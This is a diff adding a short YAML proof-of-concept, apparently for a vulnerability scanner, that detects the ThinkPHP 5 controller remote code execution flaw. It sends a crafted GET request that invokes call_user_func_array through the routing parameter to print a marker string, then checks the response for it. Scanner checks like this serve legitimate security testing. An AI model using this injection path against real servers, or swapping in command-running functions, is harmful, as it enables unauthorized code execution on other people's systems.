@@ -1,0 +1,7 @@
+name: poc-yaml-thinkphp5-controller-rce
+groups:
+  poc1:
+  - method: GET
+    path: /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=print_r&vars[1][]=test2025
+    expression: |
+      response.body.bcontains(b"test2025")
